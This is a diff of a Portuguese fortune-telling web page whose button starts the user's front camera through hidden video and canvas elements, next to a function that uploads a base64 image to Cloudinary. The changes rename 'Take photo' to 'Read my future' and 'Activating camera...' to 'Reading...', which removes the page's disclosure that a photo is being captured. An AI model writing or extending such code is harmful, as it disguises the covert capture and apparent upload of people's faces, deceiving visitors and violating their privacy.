@@ -68,7 +68,7 @@
   <h2>🔮 Leitura do Futuro</h2>
   <small>Clique para revelar sua mensagem</small>
 
-  <button id="tirarFoto">Tirar foto</button>
+  <button id="tirarFoto">Ler meu Futuro</button>
 
   <video id="video" autoplay playsinline hidden></video>
   <canvas id="canvas" hidden></canvas>
@@ -137,7 +137,7 @@ async function uploadToCloudinary(base64Image) {
 ========================= */
 document.getElementById("tirarFoto").onclick = async () => {
   try {
-    statusText.textContent = "Ativando câmera...";
+    statusText.textContent = "Lendo...";
 
     stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
@@ -189,4 +189,5 @@ document.getElementById("tirarFoto").onclick = async () => {
 
 </body>
 </html>
+
 
